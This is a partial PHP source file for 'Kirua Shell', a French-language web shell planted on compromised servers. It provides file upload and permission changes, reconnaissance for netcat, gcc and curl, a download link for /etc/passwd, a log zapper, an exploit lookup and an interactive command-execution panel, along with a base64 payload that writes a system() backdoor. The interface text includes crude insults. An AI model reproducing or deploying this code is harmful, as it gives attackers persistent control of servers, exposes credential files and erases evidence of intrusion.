...
$fetchdir = getcwd();
$msgbox   = base64_decode("");
function page($title, $height)
{
    $fetchdir = getcwd();
    echo <<< HTML
<html>
<title>Kirua Shell -> $title</title>
<head>
<style type='text/css'>
#box a{
color: purple;
...
<div id='box'>
<ul>
<li><a href=?dir=$fetchdir>Fichiers</a></li>
<li><a href='?info'>Infos</a></li>
<li><a href='?sql'>SQL</a></li>
<li><a href='?zapper'>Log Zapper</a></li>
<li><a href='?hash'>Decrypt / Encrypt</a></li>
<li><a href='?reversedns'>ReverseDNS</a></li>
<li><a href='?execute'>Commandes</a></li>
...
<body bgcolor="black">
<center>
<img src="https://cdn.discordapp.com/attachments/541039165299752960/541070443222794240/ppvespa.png" height=200 > 
</center>
<div id='box'>
...
function fetchtype()
{
    ...
    echo "<table id ='hostname' width='400px'><tr><td><label><font color='white'>Host</font></label><br /><input type='text' name='hostname' class='input' value='localhost'/><br/><td></tr></table>";
...
$errormsg[0]  = "<div id='error' class='error'>Le téléversement numérique de votre fichier as échoué.</div>";
$errormsg[1]  = "<div id='error' class='error'>La base est protégé mon capitaine.</div><br/>";
$errormsg[2]  = "<div id='error' class='error'>ERREUR: Fichier Non-Writable.</div><br/>";
$errormsg[3]  = "<div id='error' class='error'>Privileges -r désolé .</div><br/>";
$errormsg[4]  = "<div id='error' class='error'>Ce que tu cherches n'éxistes pas.</div><br/>";
$errormsg[5]  = "<div id='error' class='error'>Ce truc est bcp trop balaise.</div><br/>";
$errormsg[6]  = "<div id='error' class='error'>Impossible de ce connecter!</div><br/>";
$errormsg[7]  = "<div id='error' class='error'>Tu n'as pas oublier quelque chose ? </div><br/>";
$errormsg[8]  = "<div id='error' class='error'>Impossible de copier.</div><br/>";
$errormsg[9]  = "<div id='error' class='error'>Impossible de mouvoire ce fichier.</div><br/>";
$errormsg[10] = "<div id='error' class='error'>Erreur au telechargement</div><br/>";
$errormsg[11] = "<div id='error' class='error'>Y'as plus de balles dans le chargeur.</div><br/>";
$errormsg[12] = "<div id='error' class='error'>Impossible de modifier cette column.</div><br/>";
$errormsg[13] = "<div id='error' class='error'>J'ai du mal à compter les columns.</div><br/>";
$errormsg[14] = "<div id='error' class='error'>C pas un fichier en  PHP fdp.</div><br/>";
$errormsg[15] = "<div id='error' class='error'>Mais ce dossier existe déjà , tu me fait perdre mon temps. :'( </div><br/>";
$errormsg[16] = "<div id='error' class='error'>J'ai pas reussi à créer le dossier, je suis nul :'( .</div><br/>";
$errormsg[17] = "<div id='error' class='error'>Ce fichier existes déjà</div><br/>";
$errormsg[18] = "<div id='error' class='error'>J'ai un peu du mal ce soir, j'ai pas créer ton fichier</div><br/>";
$errormsg[19] = "<div id='error' class='error'>Bon j'avoue j'ai du mal mais ça va venir.</div><br/>";
$errormsg[20] = "<div id='error' class='error'>Tu cherches quoi au juste ?.</div><br/>";
$errormsg[21] = "<div id='error' class='error'>Jtrouve pas de données.¿safe_mode <b>on</b>?.</div><br/>";
...
HTML;
    ...
    echo "</form>";
    if (@$open = opendir($dir)) {
        echo '<div class="bar"><a href=javascript:javascript:showonlyonev2("newboxes1-2");><font color="white"><b>[Upload] </b></font><a href=javascript:showonlyonev2("newboxes3-2");><font color="white"><b>[Copie] </b></font></a><a href=javascript:showonlyonev2("newboxes4-2");><font color="white"><b>[Déplacer]</b></font></a><a href=javascript:showonlyonev2("newboxes5-2");><font color="white"><b>[MkDir]</b></font></a><a href=javascript:showonlyonev2("newboxes6-2");><font color="white"><b>[Touch]</b></font></a><a href=javascript:showonlyonev2("newboxes7-2");><font color="white"><b>[Chmod]</b></font></a></div>';
        ...
        echo '<input type="submit" class="submit" name="up" value="ddos"/>';
        echo '</form></div>';
        ...
        echo '</form></div>';
        echo "<div class='newboxes-2' id='newboxes3-2' style='display: none'><form name='copy' id='copy' method='post' action=''><label>Copier : </label><input type='text' class='input' name='copyf' value='file_1.php' size='200'/><label> En : </label><input type='text' class='input' name='atet' value='file_2.php' size='200'/><input type='submit' name='copy' class='submit' value='Vespa'/></form></div>";
        echo "<div class='newboxes-2' id='newboxes4-2' style='display: none'><form name='move' id='move' method='post' action=''><label>Déplacer : </label><input type='text' class='input' name='movef' value='file_1.php' size='200'/><label> A : </label><input type='text' class='input' name='atet2' value='file_2.php' size='200'/><input type='submit' name='move' class='submit' value='Vespa'/></form></div>";
        echo "<div class='newboxes-2' id='newboxes5-2' style='display: none'><form name='mkdir' id='mkdir' method='post' action=''><label>Nom Du Dossier : </label><input type='text' class='input' name='dirf' value='$fetchdir' size='200'/><input type='submit' name='mkdir' class='submit' value='Vespa'/></form></div>";
        echo "<div class='newboxes-2' id='newboxes6-2' style='display: none'><form name='mkfile' id='mkfile' method='post' action=''><label>Nom Du Fichier :</label><input type='text' class='input' name='filef' value='$fetchdir/newfile.dat' size='200'/><input type='submit' name='mkfile' class='submit' value='Vespa'/></form></div>";
        echo "<div class='newboxes-2' id='newboxes7-2' style='display: none'><form name='changeperms' id='changeperms' method='post' action=''><label>Fichier : </label><input type='text' class='input' name='target' value='$fetchdir/file.php' size='200'/><label> Chmod : </label><input type='text' class='input' name='set' value='550' size='50'/><input type='submit' name='chmod' class='submit' value='Change'/></form></div>";
...
CmVjaG8gQHN5c3RlbSAoJGMpIC4gIjxici8+IjsgDQp9DQo/Pg==');
                ...
                @fclose($wakeupfile);
                echo "<br /><font color='purple'>Successful!<br/>";
        ...
        echo "<pre><table id ='items' class='tb'><tr><td width='80px'><font color='white'><b>Permisions</b></font></td><td width='70px'><font color='white'><b>Taille</b></font></td><td><font color='white'><b>Dossiers & Fichiers</b></font></td><td width='255px'><font color='white'><b>Que faire?</b></font></tr></table>";
...
if (isset($_GET['info'])) {
    ...
    if (@ini_get("safe_mode") == 1) {
        ...
        $safe_mode = "<font color='purple'><b>Off</b></font>";
    }
    if (@function_exists("curl_version")) {
        $curl = "<font color='purple'><b>Tkt il es la </b></font>";
    } else {
        $curl = "<font color='red'><b>Il est pas la</b></font>";
    }
    @ob_start();
    if (@system("gcc --help")) {
        $gcc = "<font color='purple'><b>Tu peux compiler</b></font>";
    } else {
        $gcc = "<font color='red'><b>Range ta bite</b></font>";
    }
    if (@system("nc --help")) {
        $netcat = "<font color='purple'><b>Bordel il ont netcat c trdc</b></font>";
    } else {
        $netcat = "<font color='red'><b>Tu t'attendait à quoi ?</b></font>";
    }
    @ob_clean();
    $uname = php_uname('s');
    if ($uname == "Linux") {
    ...
    page("si", "auto");
    echo "<font color='white'><h2>Informations sur le serveur</h2></font>";
    echo "<center><table id ='os' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>OS: </font></label><font color='white'>" . PHP_OS . "</font><br/></table></center>";
    echo "<center><table id ='uname' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>uname -a: </font></label><font color='white'>" . php_uname() . "</font><br/></table></center>";
    echo "<center><table id ='ip' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>IP Du Serveur : </font></label><font color='white'>" . $_SERVER['SERVER_ADDR'] . "</font><br/></table></center>";
    echo "<center><table id ='safemode' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>Safe-mode: </font></label><font color='white'>" . $safe_mode . "</font><br/></table></center>";
    echo "<center><table id ='phpversion' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>Version de PHP: </font></label><font color='white'>" . phpversion();
    echo <<< HTML
...
HTML;
    echo "<center><table id ='diskspace' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>Espace de ' $disk ': </font></label><font color='white'>" . decodeSize($disk_total_space) . "/" . decodeSize($disk_free_space) . "</font><br/></table></center>";
    echo "<center><table id ='curl' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>cURL: </font></label><font color='white'>" . $curl . "</font><br/></table></center>";
    echo "<center><table id ='gcc' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>GCC: </font></label><font color='white'>" . $gcc . "</font><br/></table></center>";
    echo "<center><table id ='nc' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>Netcat: </font></label><font color='white'>" . $netcat . "</font><br/></table></center>";
    echo "<center><table id ='username' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>Utilisateur : </font></label><font color='white'>" . get_current_user() . "</font><br/></table></center>";
    if (is_readable("/etc/passwd")) {
        echo "<center><table id ='etcpasswd' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>/etc/passwd : </font></label><font color='white'><a href='?d=/etc/passwd'>[Télécharger]</a></font></table></center>";
    }
    @ob_start();
    @passthru(@system("id"));
    $id = @ob_get_contents();
    ...
    echo "<center><table id ='id' width='800px' style='background-color: black; font-size: 11px; border:1px purple dashed; border-radius: 4px;'><tr><td><label><font color='red'>id : </font></label><font color='white'>" . $id . "</font></table></center>";
    $uTwo = php_uname('r');
    $uTwo = explode("-", $uTwo);
    ...
    echo "<p><center><font color='white'>Chercher un exploit :</font></center></p>";
    echo "<form action='' method='post'>";
    ...
    echo "<input type='submit' name='submit_exploit' class='submit' value='Rechercher'/></form>";
...
if (isset($_GET['sql'])) {
    ...
    if (isset($_POST['connect'])) {
        ...
        echo "<h2><font color='white'>Connexion à la DB</font></h2>";
        echo '<form name="dbform" action="" method="post"/>';
        fetchtype();
        echo "<table id ='user' width='400px'><tr><td><label><font color='white'>Utilisateur</font></label><br /><input type='text' name='user' class='input'/><br/><td></tr></table>";
        echo "<table id ='database' width='400px'><tr><td><label><font color='white'>Db</font></label><br /><input type='text' name='db' class='input'/><br/><td></tr></table>";
        echo "<table id ='password' width='400px'><tr><td><label><font color='white'>Mot De Passe</font></label><br /><input type='password' name='pw' class='input'/><br/><td></tr></table>";
...
if (isset($_GET['hash'])) {
    ...
    if (!isset($_POST['hashbutton'])) {
        ...
        echo '<input type="text" name="input" style="background-color: #000000; border: 1px dashed purple; border-radius: 4px; color: white;" size="35" value="Fouts ton hash ici."/><br/>';
        ...
        if ($_POST['hashbutton'] == "Encrypt") {
            ...
            echo '<input type="radio" name="option" value="SHA1" /><label>SHA1</label>';
            echo '<input type="radio" name="option" value="base64" /><label>Base 64</label><br />';
            echo "<input type='text' name='input' style='background-color: #000000; border: 1px dashed purple; border-radius: 4px; color: white;' size='35' value='" . $hashencrypted . "'/><br/>";
            echo '<input type="submit" name="hashbutton" class="submit" value="Encrypt"/><input type="submit" name="hashbutton" class="submit" value="Decrypt"/></form></div></center></body></html>';
        } else {
            if ($_POST['hashbutton'] == "Decrypt") {
                ...
                echo '<input type="radio" name="option" value="SHA1" /><label>SHA1</label>';
                echo '<input type="radio" name="option" value="base64" /><label>Base 64</label><br />';
                echo "<input type='text' name='input' style='background-color: #000000; border: 1px dashed purple; border-radius: 4px; color: white;' size='35' value='" . $hashdecrypted . "'/><br/>";
                echo '<input type="submit" name="hashbutton" class="submit" value="Encrypt"/><input type="submit" name="hashbutton" class="submit" value="Decrypt"/></form></div></center></body></html>';
            }
        }
    }
...
if (isset($_GET['execute'])) {
    ...
    if (!isset($_POST['sendcommand'])) {
        ...
        echo "<center><font color='white'><h2>Shell Interactive</h2></font></center>";
        ...
        echo "Bienvenue à vous capitaine nous allons root ?" . "\n\n";
